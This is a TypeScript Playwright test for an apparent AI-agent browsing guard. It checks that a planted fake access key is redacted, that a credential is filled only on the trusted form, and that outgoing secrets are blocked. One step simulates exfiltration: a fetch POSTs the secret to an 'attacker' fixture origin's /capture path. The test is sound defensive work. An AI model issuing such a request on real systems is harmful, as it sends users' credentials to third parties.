import { chromium, type Browser } from "playwright";
import { afterAll, beforeAll, describe, expect, it } from "vitest";
import {
  OpenAgentFence,
  serializeHandle,
  validateTraceDocument,
  type PolicyEngine,
} from "@openagentfence/core";
import { createSecretSensitiveScanner } from "@openagentfence/scanners";
import { expectNoRawSecretIn, fixtureSentinel, startFixtureServer } from "@openagentfence/testing";
import { inMemoryVault } from "@openagentfence/vault";
import { playwrightAdapter, wrapPage } from "../../src/index.js";

let browser: Browser;

beforeAll(async () => {
  browser = await chromium.launch();
});

afterAll(async () => {
  await browser.close();
});

describe("M4 combined data-control gate", () => {
  it("sanitizes detection, resolves only at the exact sink, and sends zero bytes to the attacker", async () => {
    const fixtures = await startFixtureServer();
    const page = await browser.newPage();
    const [trusted, attacker] = fixtures.origins;
    if (trusted === undefined || attacker === undefined) throw new Error("fixture origins missing");
    const detected = `AKIA${"A".repeat(16)}`;
    const sentinel = fixtureSentinel();
    try {
      await page.goto(`${trusted.origin}/secret-form`);
      await page.locator("body").evaluate((body, value) => {
        const target = body as unknown as {
          insertAdjacentHTML(position: string, html: string): void;
        };
        target.insertAdjacentHTML("beforeend", `<p id="diagnostic">Diagnostic ${value}</p>`);
      }, detected);

      const session = new OpenAgentFence({
        adapter: playwrightAdapter(page, { routeRequests: true }),
        scanners: [createSecretSensitiveScanner()],
        vault: inMemoryVault(),
        policy: networkPolicy(),
      }).start({
        task: "inspect the diagnostic and sign in only to the trusted fixture",
        capabilities: {
          credentials: true,
          externalCommunication: true,
          privateNetwork: true,
          navigation: "allowlist",
        },
        origins: { allow: [trusted.origin, attacker.origin] },
        secrets: [
          {
            name: "gate-password",
            kind: "CREDENTIAL",
            origins: [trusted.origin],
            fieldTypes: ["password"],
            selector: "#password",
            formAction: `${trusted.origin}/capture`,
          },
        ],
      });

      const perception = await session.observe();
      expect(perception.findings.some((finding) => finding.category === "secret_detected")).toBe(
        true,
      );
      expect(perception.sanitizedText.value).not.toContain(detected);
      expect(perception.sanitizedText.value).toMatch(/<(?:SECRET|CREDENTIAL):/);
      expect(perception.sanitizedText.provenance.trust).toBe("web");
      expect(session.sessionTaintFloor?.trust).toBe("web");

      const handle = await session.registerSecret("gate-password", sentinel, "CREDENTIAL");
      const secure = wrapPage(session, page);
      await secure.locator("#password").fill(serializeHandle(handle));
      await secure.click("#submit");
      await expect
        .poll(() => fixtures.requests.filter((request) => request.body.includes(sentinel)).length)
        .toBe(1);
      const trustedDelivery = fixtures.requests.find((request) => request.body.includes(sentinel));
      expect(trustedDelivery?.origin).toBe(trusted.origin);

      const attackerBefore = fixtures.requests.filter(
        (request) => request.origin === attacker.origin,
      ).length;
      let blockedError: unknown;
      try {
        await page.evaluate(([url, value]) => fetch(url, { method: "POST", body: value }), [
          `${attacker.origin}/capture`,
          sentinel,
        ] as const);
      } catch (error) {
        blockedError = error;
      }
      expect(blockedError).toBeInstanceOf(Error);
      expect(
        fixtures.requests.filter((request) => request.origin === attacker.origin),
      ).toHaveLength(attackerBefore);

      const trace = await session.end();
      expect(validateTraceDocument(trace).ok).toBe(true);
      for (const artifact of [perception, blockedError, trace]) {
        expect(expectNoRawSecretIn(artifact, detected)).toBe(true);
        expect(expectNoRawSecretIn(artifact, sentinel)).toBe(true);
      }
      expect(
        trace.events.some(
          (event) =>
            event.kind === "network_mutation" &&
            event.data["verdict"] === "block" &&
            Array.isArray(event.data["reasons"]) &&
            event.data["reasons"].includes("sensitive_value_in_egress"),
        ),
      ).toBe(true);
    } finally {
      await page.close();
      await fixtures.close();
    }
  });
});

function networkPolicy(): PolicyEngine {
  return {
    policyHash: "m4-data-control-gate",
    destinationRules: {
      blockPrivateNetworks: false,
      internalNetworkRanges: [],
      maxRedirectHops: 5,
    },
    evaluate: () => ({
      verdict: "ALLOW",
      reasons: [],
      matchedRules: [],
      policyHash: "m4-data-control-gate",
    }),
  };
}
